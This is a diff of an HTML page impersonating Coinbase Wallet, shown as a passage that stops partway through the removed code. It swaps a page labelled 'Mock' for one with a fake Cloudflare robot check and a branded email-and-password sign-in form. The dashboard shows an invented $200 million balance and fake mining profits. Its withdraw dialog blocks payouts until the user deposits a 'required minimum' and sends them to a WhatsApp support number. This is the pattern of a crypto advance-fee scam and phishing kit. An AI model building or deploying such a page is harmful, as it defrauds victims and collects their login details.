@@ -2,639 +2,563 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Coinbase Wallet Mock - Crypto Portfolio</title>
+  <title>Coinbase Wallet — Secure Portfolio</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      margin: 0; padding: 0;
-      font-family: 'Inter', Arial, sans-serif;
-      background: #f6f8fa;
+    html, body {
+      margin: 0; padding: 0; width: 100%; height: 100%;
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      background: #f5f6fa;
       color: #222;
     }
-    .centered {
+    /* Cloudflare overlay styles (from provided code) */
+    #cloudflare-verify-overlay {
+      position: fixed;
+      z-index: 2147483647;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      transition: opacity 0.3s;
     }
-    .card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 4px 32px 0 rgba(40,40,60,.10);
-      padding: 32px 28px;
-      min-width: 340px;
-      max-width: 98vw;
-      margin: 12px;
-      position: relative;
-    }
-    .logo {
-      width: 54px; height: 54px;
-      margin-bottom: 14px;
-      border-radius: 50%;
-      background: #fff;
-      box-shadow: 0 2px 12px 0 rgba(0,0,0,0.08);
-      object-fit: contain;
-    }
-    .avatar {
-      width: 42px; height: 42px;
-      border-radius: 50%;
-      border: 2px solid #0052ff;
-      object-fit: cover;
-      background: #eaf1fb;
-      margin-left: 6px;
-      cursor: pointer;
-      transition: box-shadow .2s;
-    }
-    .header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 22px;
-    }
-    .header .user {
-      display: flex;
-      align-items: center;
-    }
-    .big-balance {
-      font-size: 2.1rem;
-      font-weight: 700;
-      color: #0052ff;
-      margin-bottom: 16px;
-    }
-    .favorites {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin-bottom: 18px;
-      margin-top: 10px;
-    }
-    .fav-token {
-      background: #eaf1fb;
-      border-radius: 7px;
-      padding: 10px 12px;
-      min-width: 74px;
+    #cloudflare-verify-box {
+      background: #f7f7fb;
+      border-radius: 14px;
+      box-shadow: 0 4px 32px rgba(40,40,60,0.10);
+      border: 1px solid #e0e4ea;
+      padding: 2.8em 2.5em 2.4em 2.5em;
+      min-width: 350px;
+      max-width: 97vw;
       text-align: center;
-      font-size: 15px;
-      font-weight: 500;
-      color: #222;
-      box-shadow: 0 1px 8px 0 rgba(40,40,60,0.06);
-    }
-    .fav-token span {
-      display: block;
-      font-size: 12px;
-      color: #666;
-    }
-    .mining-area {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      margin-bottom: 16px;
-    }
-    .mining-wheel {
-      width: 36px;
-      height: 36px;
-      border-radius: 50%;
-      background: #f7931a22;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 4px solid #f7931a;
       position: relative;
-      animation: spin 5s linear infinite;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .cf-logo {
+      width: 110px;
+      margin-bottom: 1.6em;
+      display: block;
+    }
+    .cf-lock {
+      color: #f38020;
+      font-size: 1.6em;
+      margin-bottom: 0.2em;
+    }
+    #cloudflare-verify-title {
+      font-size: 1.3em;
+      font-weight: 600;
+      color: #222;
+      letter-spacing: .02em;
+      margin-bottom: 0.7em;
+    }
+    #cloudflare-verify-desc {
+      font-size: 1.06em;
+      color: #444;
+      margin: 0.4em 0 2em 0;
+      line-height: 1.5;
+    }
+    #cloudflare-challenge-btn {
+      background: linear-gradient(89deg, #f38020 0%, #f7b500 100%);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 0.8em 2.7em;
+      font-size: 1.07em;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 0.7em;
+      box-shadow: 0 2px 8px #f3802016;
+      transition: background 0.2s, box-shadow 0.2s;
+      outline: none;
+      position: relative;
+    }
+    #cloudflare-challenge-btn:active,
+    #cloudflare-challenge-btn:focus {
+      background: linear-gradient(89deg, #f7b500 0%, #f38020 100%);
+      box-shadow: 0 2px 17px #f3802040;
+    }
+    #cloudflare-spinner {
+      display: none;
+      margin: 0 auto;
+      margin-top: 1.6em;
+      width: 36px; height: 36px;
+      border-radius: 50%;
+      border: 4px solid #f38020;
+      border-top: 4px solid #fff3e6;
+      animation: spin 1s linear infinite;
+      border-left: 4px solid #f7b500;
+      border-bottom: 4px solid #fff3e6;
     }
     @keyframes spin {
       100% { transform: rotate(360deg); }
     }
-    .daily-profit {
-      font-size: 1.1rem;
-      font-weight: 600;
-      color: #27ae60;
+    @media (max-width: 500px) {
+      #cloudflare-verify-box { min-width: unset; padding: 1em 0.5em; }
     }
-    .section-title {
-      font-weight: 600;
-      font-size: 1.13rem;
-      margin-bottom: 7px;
-      color: #333;
+    @media (max-width:400px) {
+      #cloudflare-verify-box { padding: 1em 0.1em; }
     }
-    .actions {
-      display: flex;
-      gap: 16px;
-      margin-top: 14px;
-      margin-bottom: 8px;
-    }
-    .btn {
-      flex: 1;
-      padding: 12px;
-      border-radius: 8px;
-      border: none;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background .2s;
-    }
-    .btn-deposit {
-      background: #0052ff;
-      color: #fff;
-    }
-    .btn-withdraw {
-      background: #f7931a;
-      color: #fff;
-    }
-    .tokens-list {
-      margin-top: 7px;
-    }
-    .token-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 9px 0;
-      border-bottom: 1px solid #f3f3f3;
-      cursor: pointer;
-      transition: background .14s;
-    }
-    .token-row:hover {
-      background: #f9fbff;
-    }
-    .token-symbol {
-      font-weight: 600;
-      color: #0052ff;
-      width: 48px;
-    }
-    .token-balance {
-      color: #222;
-      font-weight: 500;
-    }
-    .modal-bg {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(30,40,60,0.22);
-      z-index: 9999;
-      display: flex;
+    /* Coinbase login & dashboard styles */
+    #main-app {
+      display: none;
+      min-height: 100vh;
+      background: #f5f6fa;
       align-items: center;
       justify-content: center;
-      animation: fadeIn .18s;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; } to { opacity: 1; }
+    .login-card, .dashboard-card {
+      background: #fff;
+      box-shadow: 0 8px 32px rgba(40,40,60,0.11);
+      border-radius: 16px;
+      padding: 2.8em 2.2em 2.4em 2.2em;
+      max-width: 360px;
+      width: 96vw;
+      margin: 48px auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-    .modal {
+    .cb-logo {
+      width: 80px;
+      margin-bottom: 1.2em;
+      display: block;
+    }
+    .user-avatar {
+      width: 48px; height: 48px; border-radius: 50%; object-fit: cover;
+      border: 2.5px solid #eaf1fb; margin-left: 8px;
+    }
+    .coin-row {
+      display: flex; align-items: center; gap: 10px;
+    }
+    .coin-img {
+      width: 28px; height: 28px; border-radius: 50%; background: #f7fafe; border: 1.5px solid #e7e7f7;
+      object-fit: contain; margin-right: 7px;
+    }
+    .cb-title {
+      font-size: 1.2em; font-weight: bold; letter-spacing: .01em; margin-bottom: 1.4em; color: #232a3d;
+    }
+    .cb-input {
+      width: 100%;
+      padding: 0.8em 1em;
+      background: #f5f6fb;
+      border-radius: 8px;
+      border: 1px solid #e2e6f6;
+      font-size: 1em;
+      margin-bottom: 1.2em;
+      outline: none;
+      transition: border 0.18s;
+    }
+    .cb-input:focus { border-color: #3861fb; }
+    .cb-btn {
+      background: linear-gradient(89deg, #3861fb 0%, #41a5ff 100%);
+      color: #fff;
+      border: none;
+      border-radius: 7px;
+      padding: 0.8em 2em;
+      font-size: 1.05em;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 0.3em;
+      box-shadow: 0 2px 12px #3861fb16;
+      transition: background 0.2s, box-shadow 0.2s;
+      outline: none;
+      width: 100%;
+    }
+    .cb-btn:active,
+    .cb-btn:focus {
+      background: linear-gradient(89deg, #41a5ff 0%, #3861fb 100%);
+      box-shadow: 0 2px 17px #3861fb24;
+    }
+    .cb-code-box {
+      background: #f5f8fb;
+      border-radius: 8px;
+      padding: 1.1em 1em;
+      text-align: center;
+      margin-top: 1.2em;
+      font-size: 1.19em;
+      font-weight: bold;
+      letter-spacing: .25em;
+      color: #3861fb;
+      border: 1.5px dashed #bdd1f8;
+      user-select: all;
+    }
+    .cb-copy-btn {
+      margin-top: 12px;
+      display: inline-block;
+      background: #eaf1fb;
+      color: #3861fb;
+      border: none;
+      border-radius: 5px;
+      padding: 0.5em 1.4em;
+      font-size: 0.98em;
+      font-weight: 600;
+      cursor: pointer;
+      outline: none;
+      transition: background 0.15s;
+    }
+    .cb-copy-btn:active { background: #d6e5f7; }
+    .cb-balance {
+      font-size: 1.8em; font-weight: bold; letter-spacing: .01em; color: #222; margin-bottom: 0.15em;
+    }
+    .cb-balance-label {
+      font-size: 0.99em; color: #8ba3c7; margin-bottom: 1.4em;
+    }
+    .dashboard-actions {
+      display: flex; gap: 16px; margin: 1.5em 0 0.5em 0; width: 100%;
+    }
+    .cb-action-btn {
+      flex: 1;
+      background: linear-gradient(89deg, #3861fb 0%, #41a5ff 100%);
+      color: #fff;
+      border: none;
+      border-radius: 7px;
+      padding: 0.85em 0;
+      font-size: 1.06em;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 2px 12px #3861fb16;
+      outline: none;
+      transition: background 0.2s;
+    }
+    .cb-action-btn.withdraw {
+      background: linear-gradient(89deg, #f7931a 0%, #ffae4d 100%);
+    }
+    .cb-action-btn:active { background: #3861fb; }
+    .cb-action-btn.withdraw:active { background: #f7931a; }
+    .cb-favs {
+      display: flex; gap: 11px; margin: 1.1em 0 1.6em 0;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .cb-fav-token {
+      background: #f7fafe;
+      border-radius: 9px;
+      padding: 0.4em 1.1em 0.4em 0.7em;
+      display: flex; align-items: center; gap: 8px;
+      font-size: 1em;
+      font-weight: 500;
+      color: #212d3a;
+      border: 1.5px solid #e7e7f7;
+      min-width: 95px;
+      justify-content: flex-start;
+    }
+    .cb-dashboard-row {
+      width: 100%; display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.1em;
+    }
+    .cb-mining {
+      display: flex; align-items: center; gap: 13px; margin-bottom: 0.7em;
+    }
+    .cb-mining-wheel {
+      width: 34px; height: 34px; border-radius: 50%;
+      border: 4px solid #f7931a;
+      border-top: 4px solid #fff3e6;
+      border-left: 4px solid #f7b500;
+      border-bottom: 4px solid #fff3e6;
+      animation: spin 5s linear infinite;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.3em;
+      margin-right: 1px;
+    }
+    .cb-mining-label {
+      font-size: 1.09em; font-weight: 500; color: #f7931a; margin-bottom: 2px;
+    }
+    .cb-mining-profit {
+      font-size: 1.14em; color: #1fa03e; font-weight: bold;
+    }
+    .cb-support-link {
+      margin-top: 1.5em; display: inline-block;
+      background: #25d366;
+      color: #fff; font-weight: 600; font-size: 1.06em;
+      padding: 0.62em 2.1em;
+      border-radius: 8px;
+      text-decoration: none; letter-spacing: 0.04em;
+      transition: background 0.18s;
+    }
+    .cb-support-link:active { background: #1fa03e; }
+    /* Modals */
+    .cb-modal-bg {
+      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(21,33,56,0.14); z-index: 9999;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .cb-modal {
       background: #fff;
       border-radius: 14px;
-      padding: 32px 28px;
-      min-width: 330px;
-      max-width: 98vw;
-      position: relative;
-      box-shadow: 0 6px 32px rgba(40,40,60,0.20);
-      animation: popin .26s cubic-bezier(.7,1.7,.8,1.1);
-    }
-    @keyframes popin {
-      from { transform: scale(.93); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-    .modal .close {
-      position: absolute;
-      right: 18px; top: 18px;
-      font-size: 1.6rem;
-      background: none;
-      border: none;
-      color: #888;
-      cursor: pointer;
-      transition: color .2s;
-      padding: 2px;
-    }
-    .modal .close:hover { color: #f7931a;}
-    .address-box {
-      background: #f6f6fb;
-      padding: 9px 10px;
-      border-radius: 6px;
-      font-size: 15px;
-      word-break: break-all;
-      margin-bottom: 10px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .copy-btn {
-      background: #0052ff;
-      color: #fff;
-      border: none;
-      padding: 4px 10px;
-      border-radius: 5px;
-      font-size: 13px;
-      cursor: pointer;
-      margin-left: 10px;
-      transition: background .2s;
-    }
-    .copy-btn:active { background: #0041d6; }
-    .qr-img {
-      width: 110px; height: 110px;
-      border-radius: 7px;
-      margin: 12px 0;
-      display: block;
-    }
-    .input {
-      width: 100%;
-      padding: 9px;
-      border-radius: 6px;
-      border: 1px solid #e1e5ee;
-      font-size: 15px;
-      margin-bottom: 10px;
-      margin-top: 2px;
-      box-sizing: border-box;
-    }
-    .token-select {
-      width: 100%;
-      margin-bottom: 10px;
-      padding: 7px;
-      font-size: 15px;
-      border-radius: 7px;
-      border: 1px solid #e1e5ee;
-      background: #fafaff;
-    }
-    .confirm-btn {
-      width: 100%;
-      background: #f7931a;
-      color: #fff;
-      border: none;
-      border-radius: 7px;
-      padding: 11px;
-      font-size: 1rem;
-      font-weight: 700;
-      margin-top: 7px;
-      margin-bottom: 7px;
-      cursor: pointer;
-      transition: background .2s;
-    }
-    .confirm-btn:active { background: #c36c0c; }
-    .notice {
-      background: #fff8e5;
-      border-left: 4px solid #f7931a;
-      color: #b16b00;
-      font-size: 15px;
-      padding: 9px 13px;
-      border-radius: 7px;
-      margin-bottom: 11px;
-      margin-top: 5px;
-    }
-    .support-btn {
-      display: inline-block;
-      background: #25d366;
-      color: #fff;
-      font-weight: 700;
-      border-radius: 7px;
-      padding: 8px 14px;
-      text-decoration: none;
-      margin-top: 11px;
-      font-size: 15px;
-      transition: background .2s;
-    }
-    .support-btn:hover { background: #1ebe5b; }
-    /* Cloud fail screen */
-    .cloudfail {
-      background: linear-gradient(120deg, #353a55 0%, #434068 100%);
-      color: #fff;
-      min-height: 100vh;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-    }
-    .cloudfail .cf-card {
-      background: #232748;
-      border-radius: 12px;
-      box-shadow: 0 2px 32px rgba(80,80,120,0.17);
-      padding: 40px 32px;
+      max-width: 380px;
       min-width: 320px;
-      max-width: 95vw;
-      text-align: center;
+      padding: 2.2em 2em 2em 2em;
+      box-shadow: 0 10px 42px #1114  ;
+      position: relative;
+      animation: fadein 0.18s;
     }
-    .cloudfail button {
-      margin-top: 24px;
-      background: #f7931a;
-      color: #fff;
-      border: none;
-      border-radius: 7px;
-      padding: 13px 34px;
-      font-size: 17px;
-      font-weight: 700;
-      cursor: pointer;
+    @keyframes fadein {from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
+    .cb-modal-close {
+      position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 1.7em; color: #bbb; cursor: pointer;
+      transition: color 0.15s;
     }
-    .login-form input {
-      margin: 7px 0;
+    .cb-modal-close:hover { color: #222;}
+    .cb-modal-qr {
+      width: 124px; height: 124px; background: #f7f7fb; display: block; margin: 20px auto 13px auto; border-radius: 9px; border: 1.5px solid #e7e7f7;
     }
-    .login-form button {
-      margin-top: 12px;
-      width: 100%;
-      background: #0052ff;
-      color: #fff;
-      border: none; border-radius: 7px;
-      padding: 11px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background .2s;
+    .cb-modal-token-list {
+      display: flex; flex-direction: column; gap: 7px; margin-bottom: 1.3em;
     }
-    .login-form button:active { background: #003eb6; }
-    .code-box {
-      margin-top: 18px;
-      background: #f3f7fd;
-      padding: 16px;
-      border-radius: 8px;
-      text-align: center;
+    .cb-modal-token-item {
+      padding: 0.6em 1em; border-radius: 7px; border: 1.2px solid #e7e7f7;
+      display: flex; align-items: center; gap: 10px;
+      background: #f7fafe; font-size: 1.05em; cursor: pointer; transition: border 0.15s;
     }
-    .code-box .code {
-      font-size: 1.8rem;
-      font-weight: 700;
-      color: #0052ff;
-      letter-spacing: 6px;
-      margin-bottom: 6px;
-      display: block;
+    .cb-modal-token-item.selected { border: 2px solid #3861fb; background: #eaf1fb; }
+    .cb-modal input, .cb-modal select {
+      width: 100%; margin-bottom: 0.9em; border-radius: 7px; border: 1px solid #e7e7f7; padding: 0.7em 0.9em; font-size: 1em; background: #f5f6fb;
+      outline: none; transition: border 0.17s;
     }
-    .code-box .copy-btn { margin: 0 0 8px 0; }
-    @media(max-width: 450px) {
-      .card, .modal, .cloudfail .cf-card { min-width: 98vw; padding: 20px 3vw;}
+    .cb-modal input:focus, .cb-modal select:focus { border-color: #3861fb; }
+    .cb-modal .cb-btn { margin-top: 0.3em; }
+    .cb-modal-note {
+      background: #fff8eb; color: #e67e22; border-radius: 8px; padding: 0.7em 1em; font-size: 0.98em; margin-top: 0.85em; text-align: left;
+    }
+    /* Responsive */
+    @media (max-width: 430px) {
+      .login-card, .dashboard-card { padding: 1.2em 0.5em 1.3em 0.5em; min-width: unset; }
+      .cb-modal { padding: 1.1em 0.3em 1em 0.3em; min-width: unset; }
     }
   </style>
 </head>
 <body>
-  <div id="root"></div>
+  <!-- Cloudflare Verification Overlay -->
+  <div id="cloudflare-verify-overlay" aria-modal="true" role="dialog" aria-labelledby="cloudflare-verify-title">
+    <div id="cloudflare-verify-box">
+      <svg class="cf-logo" viewBox="0 0 180 40" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <ellipse cx="36" cy="20" rx="36" ry="16" fill="#F38020"/>
+        <ellipse cx="110" cy="30" rx="38" ry="10" fill="#F7B500"/>
+        <ellipse cx="148" cy="26" rx="20" ry="7" fill="#F38020"/>
+      </svg>
+      <div class="cf-lock" aria-hidden="true">🔒</div>
+      <div id="cloudflare-verify-title">Cloudflare Verification</div>
+      <div id="cloudflare-verify-desc">
+        For security, please confirm you are not a robot.<br>
+        This quick check helps keep the Internet safe for everyone worldwide.<br>
+        Just click the button below to continue.
+      </div>
+      <button id="cloudflare-challenge-btn" aria-label="Confirm you are not a robot">I'm not a robot</button>
+      <div id="cloudflare-spinner" aria-hidden="true"></div>
+    </div>
+  </div>
+  <!-- Main App -->
+  <div id="main-app">
+    <!-- Login Form -->
+    <form id="cb-login-form" class="login-card" autocomplete="off" style="display:none;">
+      <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=030" alt="Coinbase" class="cb-logo">
+      <div class="cb-title">Sign in to Coinbase Wallet</div>
+      <input class="cb-input" type="email" id="cb-login-email" placeholder="Email address" required autocomplete="off" spellcheck="false">
+      <input class="cb-input" type="password" id="cb-login-password" placeholder="Password" required autocomplete="off" spellcheck="false">
+      <button type="submit" class="cb-btn" id="cb-login-btn">Continue</button>
+      <div id="cb-login-step2" style="width:100%;display:none;">
+        <div class="cb-code-box" id="cb-login-code"></div>
+        <button class="cb-copy-btn" id="cb-copy-login-code" type="button">Copy code & Login</button>
+      </div>
+    </form>
+    <!-- Dashboard -->
+    <div id="cb-dashboard" class="dashboard-card" style="display:none;">
+      <div class="cb-dashboard-row">
+        <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=030" alt="Coinbase" class="cb-logo" style="width:48px;">
+        <div style="flex:1;">
+          <div style="font-size:1.14em;font-weight:600;">Coinbase Portfolio</div>
+          <div class="cb-balance" id="cb-balance">$200,000,000</div>
+          <div class="cb-balance-label">Total Portfolio Balance</div>
+        </div>
+        <img src="https://i.pravatar.cc/120?u=coinbase" alt="User Avatar" class="user-avatar" id="cb-avatar">
+      </div>
+      <div class="cb-favs" id="cb-favs">
+        <!-- Favorite Tokens -->
+      </div>
+      <div class="cb-mining">
+        <div class="cb-mining-wheel" id="cb-mining-wheel">⛏️</div>
+        <div>
+          <div class="cb-mining-label">Mining Wheel</div>
+          <div class="cb-mining-profit" id="cb-mining-profit">+$0.00</div>
+        </div>
+        <div style="margin-left:18px;">
+          <div style="font-size:0.96em;color:#298d3a;font-weight:500;">Daily Profits</div>
+          <div style="font-size:1.09em;font-weight:bold;" id="cb-daily-profit">+$0.00</div>
+        </div>
+      </div>
+      <div class="dashboard-actions">
+        <button class="cb-action-btn" id="cb-deposit-btn">Deposit</button>
+        <button class="cb-action-btn withdraw" id="cb-withdraw-btn">Withdraw</button>
+      </div>
+      <a class="cb-support-link" href="https://wa.me/12722764080" target="_blank" rel="noopener">Contact Support</a>
+    </div>
+    <!-- Deposit Modal -->
+    <div id="cb-deposit-modal" class="cb-modal-bg" style="display:none;">
+      <div class="cb-modal">
+        <button class="cb-modal-close" onclick="closeDepositModal()">&times;</button>
+        <div style="font-size:1.17em;font-weight:600;margin-bottom:0.6em;">Deposit Funds</div>
+        <div style="font-size:0.99em;margin-bottom:0.4em;">Copy your wallet address or scan QR code:</div>
+        <input type="text" value="0x1234...abcd5678" readonly style="margin-bottom:0.4em;" id="cb-deposit-address">
+        <button class="cb-copy-btn" type="button" onclick="copyDepositAddress()">Copy Address</button>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=124x124&data=0x1234...abcd5678" alt="QR" class="cb-modal-qr">
+      </div>
+    </div>
+    <!-- Withdraw Modal -->
+    <div id="cb-withdraw-modal" class="cb-modal-bg" style="display:none;">
+      <div class="cb-modal">
+        <button class="cb-modal-close" onclick="closeWithdrawModal()">&times;</button>
+        <div style="font-size:1.17em;font-weight:600;margin-bottom:0.65em;">Withdraw Funds</div>
+        <div class="cb-modal-token-list" id="cb-token-list"></div>
+        <input type="number" placeholder="Amount to withdraw" id="cb-withdraw-amount" min="0" step="any">
+        <input type="text" placeholder="Recipient Address" id="cb-withdraw-address" autocomplete="off">
+        <button class="cb-btn" onclick="showWithdrawConfirm()">Confirm Withdraw</button>
+        <div class="cb-modal-note" id="cb-withdraw-note" style="display:none;">
+          You can’t withdraw because you are not an active user.<br>
+          Start up with the required minimum to withdraw your expected profits after 4 hours.<br>
+          <b>Contact support for more info.</b>
+        </div>
+      </div>
+    </div>
+  </div>
   <script>
-    // --- Data ---
-    const WALLET_ADDRESS = "0x1234...abcd5678";
+    // Cloudflare overlay logic
+    window.onload = function() {
+      setTimeout(function() {
+        var btn = document.getElementById('cloudflare-challenge-btn');
+        if(btn) btn.focus();
+      }, 250);
+    };
+    document.getElementById('cloudflare-challenge-btn').onclick = function() {
+      this.disabled = true;
+      document.getElementById('cloudflare-spinner').style.display = 'block';
+      this.textContent = 'Verifying...';
+      setTimeout(function() {
+        let overlay = document.getElementById('cloudflare-verify-overlay');
+        overlay.style.opacity = '0';
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          document.getElementById('main-app').style.display = 'flex';
+          document.getElementById('cb-login-form').style.display = 'flex';
+        }, 350);
+      }, 1100);
+    };
+    // Coinbase login logic
+    function randomCode(len=6) {
+      return Math.random().toString().substr(2, len).toUpperCase();
+    }
+    let loginCode = '';
+    document.getElementById('cb-login-form').onsubmit = function(e) {
+      e.preventDefault();
+      // Step 2: show code
+      loginCode = randomCode(6);
+      document.getElementById('cb-login-step2').style.display = 'block';
+      document.getElementById('cb-login-code').textContent = loginCode;
+      document.getElementById('cb-login-btn').style.display = 'none';
+      document.getElementById('cb-login-email').readOnly = true;
+      document.getElementById('cb-login-password').readOnly = true;
+    };
+    document.getElementById('cb-copy-login-code').onclick = function() {
+      navigator.clipboard.writeText(loginCode);
+      // Proceed to dashboard
+      document.getElementById('cb-login-form').style.display = 'none';
+      document.getElementById('cb-dashboard').style.display = 'flex';
+      setupDashboard();
+    };
+    // Dashboard logic
+    // Tokens
     const TOKENS = [
-      { symbol: "USDT", name: "Tether", balance: 60000000 },
-      { symbol: "ETH", name: "Ethereum", balance: 50000000 },
-      { symbol: "BNB", name: "Binance Coin", balance: 30000000 },
-      { symbol: "SOL", name: "Solana", balance: 20000000 },
-      { symbol: "BTC", name: "Bitcoin", balance: 40000000 }
+      { symbol: "USDT", name: "Tether", balance: 60000000, img: "https://cryptologos.cc/logos/tether-usdt-logo.png?v=030" },
+      { symbol: "ETH", name: "Ethereum", balance: 50000000, img: "https://cryptologos.cc/logos/ethereum-eth-logo.png?v=030" },
+      { symbol: "BNB", name: "Binance Coin", balance: 30000000, img: "https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=030" },
+      { symbol: "SOL", name: "Solana", balance: 20000000, img: "https://cryptologos.cc/logos/solana-sol-logo.png?v=030" },
+      { symbol: "BTC", name: "Bitcoin", balance: 40000000, img: "https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=030" }
     ];
     const FAVORITES = ["USDT", "ETH", "BNB", "SOL", "BTC"];
-    const DASHBOARD_BALANCE = 200000000;
-    const MINING_RATE = 1.8; // USD per 5s
-    const MINING_DURATION = 4 * 60 * 60 * 1000; // 4 hours in ms
-
-    // --- State & Utility ---
-    function $(id) { return document.getElementById(id); }
-    function randomCode(len = 6) { return Math.random().toString().substr(2, len).toUpperCase(); }
-    function qrUrl(addr) { return "https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=" + encodeURIComponent(addr); }
-    function formatMoney(n) { return n.toLocaleString('en-US', { maximumFractionDigits: 2 }); }
-
-    function getMiningData() {
-      let data = localStorage.getItem("miningData");
-      if (data) return JSON.parse(data);
-      const now = Date.now();
-      const d = { start: now, current: 0, lastUpdate: now };
-      localStorage.setItem("miningData", JSON.stringify(d));
-      return d;
+    function setupDashboard() {
+      // Show favorites
+      let favs = document.getElementById('cb-favs');
+      favs.innerHTML = "";
+      FAVORITES.forEach(sym => {
+        let t = TOKENS.find(tk=>tk.symbol===sym);
+        let el = document.createElement('div');
+        el.className = 'cb-fav-token';
+        el.innerHTML = `<img src="${t.img}" class="coin-img" alt="${t.symbol}">${t.symbol} <span style="color:#7f8fa6;font-size:0.96em;">${t.balance.toLocaleString()}</span>`;
+        favs.appendChild(el);
+      });
+      // Mining wheel and daily profit
+      setupMiningProfit();
     }
-    function setMiningData(data) {
-      localStorage.setItem("miningData", JSON.stringify(data));
-    }
-    function calcMiningProfit(start, now) {
-      const duration = Math.min(now - start, MINING_DURATION);
-      return Math.floor(duration / 5000) * MINING_RATE;
-    }
-
-    // --- Templating ---
-    function cloudFailView(continueFn) {
-      return `
-        <div class="cloudfail">
-          <div class="cf-card">
-            <h1 style="font-size:2rem;margin-bottom:6px;">Облачная проверка не удалась</h1>
-            <div>Cloud verification failed.<br>Пожалуйста, продолжите для входа.</div>
-            <button onclick="__continueCloudFail()">
-              Продолжить / Continue
-            </button>
-          </div>
-        </div>
-      `;
-    }
-    function loginView(showCode, code, loginFn, copyCodeFn) {
-      return `
-        <div class="centered">
-          <div class="card" style="max-width:370px;">
-            <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=030" alt="Coinbase Logo" class="logo">
-            <h2 style="margin-bottom:4px;">Coinbase Wallet Login</h2>
-            <form class="login-form" autocomplete="off" onsubmit="__login(event)">
-              <input id="email" class="input" type="email" placeholder="Email" required autocomplete="off">
-              <input id="password" class="input" type="password" placeholder="Password" required autocomplete="off">
-              <button type="submit">Login</button>
-            </form>
-            ${showCode ? `
-              <div class="code-box">
-                <div class="code" id="login-code">${code}</div>
-                <button class="copy-btn" onclick="__copyLoginCode()">Copy Code & Continue</button>
-                <div style="color:#888;font-size:14px;">Copy this code to finish login</div>
-              </div>
-            ` : ""}
-          </div>
-        </div>
-      `;
-    }
-
-    function dashboardView(user, profits, openDeposit, openWithdraw, logoutFn) {
-      return `
-        <div class="centered" style="padding:20px 0;">
-          <div class="card" style="width:100%;max-width:430px;">
-            <div class="header">
-              <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=030" alt="Coinbase Logo" class="logo" style="margin-bottom:0;">
-              <div style="flex:1;margin-left:16px;">
-                <div style="font-weight:600;font-size:1.15rem;">
-                  Welcome, <span style="color:#0052ff">${user.email.split("@")[0]}</span>
-                </div>
-                <div style="font-size:15px;color:#888;">
-                  Portfolio&nbsp;Balance
-                </div>
-              </div>
-              <div class="user" title="Change Avatar">
-                <img class="avatar" src="https://i.pravatar.cc/64?u=coinbase" alt="User Avatar">
-              </div>
-            </div>
-            <div class="big-balance">$${formatMoney(DASHBOARD_BALANCE)}</div>
-            <div class="mining-area">
-              <div class="mining-wheel"><span style="font-size:1.5rem;">⛏️</span></div>
-              <div>
-                <div style="font-size:15px;font-weight:500;">Daily Profits</div>
-                <div class="daily-profit" id="profit-amt">+$${profits.toFixed(2)}</div>
-              </div>
-            </div>
-            <div class="section-title">Favorite Tokens</div>
-            <div class="favorites">
-              ${FAVORITES.map(sym => {
-                const tk = TOKENS.find(t => t.symbol === sym);
-                return `<div class="fav-token" title="${tk.name}">
-                  ${sym}
-                  <span>${formatMoney(tk ? tk.balance : 0)}</span>
-                </div>`;
-              }).join('')}
-            </div>
-            <div class="actions">
-              <button class="btn btn-deposit" onclick="__openDeposit()">Deposit</button>
-              <button class="btn btn-withdraw" onclick="__openWithdraw()">Withdraw</button>
-            </div>
-            <div class="section-title" style="margin-top:18px;">All Tokens</div>
-            <div class="tokens-list">
-              ${TOKENS.map(t =>
-                `<div class="token-row" onclick="__openWithdraw('${t.symbol}')">
-                  <div class="token-symbol">${t.symbol}</div>
-                  <div class="token-balance">${formatMoney(t.balance)}</div>
-                </div>`).join('')}
-            </div>
-            <button style="margin:18px 0 0 0;float:right;background:none;border:none;color:#888;font-size:15px;cursor:pointer;"
-                    onclick="__logout()">Logout</button>
-          </div>
-        </div>
-      `;
-    }
-    function depositModalView(addr, closeFn) {
-      return `
-        <div class="modal-bg" onclick="__closeModal(event)">
-          <div class="modal" onclick="event.stopPropagation()">
-            <button class="close" onclick="__closeModal(event)">&times;</button>
